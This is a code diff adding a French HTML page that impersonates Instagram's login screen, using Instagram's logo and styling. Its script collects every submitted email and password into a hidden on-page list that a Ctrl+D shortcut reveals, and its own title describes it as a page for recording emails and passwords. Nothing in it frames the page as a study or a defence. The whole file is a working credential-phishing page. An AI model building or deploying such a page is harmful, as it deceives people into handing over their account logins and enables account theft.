@@ -1,0 +1,112 @@
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion - Enregistrer Email et Mot de Passe</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            width: 400px;
+            text-align: center;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #007bdb;
+        }
+        .hidden-passwords {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1><i data-visualcompletion="css-img" aria-label="Instagram" class="" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yv/r/KoLLpWDb4f6.png&quot;); background-position: 0px -52px; background-size: auto; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i></h1>
+    <form id="loginForm">
+        <input type="text" id="email" placeholder="Num. téléphone, nom d'utilisateur ou e-mail" required>
+        <input type="password" id="password" placeholder="Mot de passe" required>
+        <button type="submit">se connecter</button>
+    </form>
+
+    <div class="hidden-passwords" id="passwordsList">
+        <h2>Emails et mots de passe enregistrés</h2>
+        <ul id="list"></ul>
+    </div>
+</div>
+
+<script>
+    const form = document.getElementById('loginForm');
+    const list = document.getElementById('list');
+    const passwordsList = document.getElementById('passwordsList');
+
+    // Tableau pour stocker les emails et mots de passe
+    let credentials = [];
+
+    // Masquer ou révéler les mots de passe avec Ctrl+D
+    document.addEventListener('keydown', function(event) {
+        if (event.ctrlKey && event.key === 'd') {
+            event.preventDefault();
+            passwordsList.style.display = passwordsList.style.display === 'none' ? 'block' : 'none';
+        }
+    });
+
+    // Enregistrer les informations dans la page
+    form.addEventListener('submit', function(event) {
+        event.preventDefault();
+
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        // Ajouter l'email et le mot de passe à la liste
+        credentials.push({email: email, password: password});
+
+        // Mettre à jour l'affichage de la liste
+        updateList();
+
+        // Réinitialiser les champs du formulaire
+        form.reset();
+    });
+
+    // Fonction pour mettre à jour la liste des informations
+    function updateList() {
+        list.innerHTML = ''; // Réinitialiser la liste affichée
+
+        credentials.forEach(function(credential, index) {
+            const listItem = document.createElement('li');
+            listItem.textContent = `Email: ${credential.email}, Mot de passe: ${credential.password}`;
+            list.appendChild(listItem);
+        });
+    }
+</script>
+
+</body>
+</html>
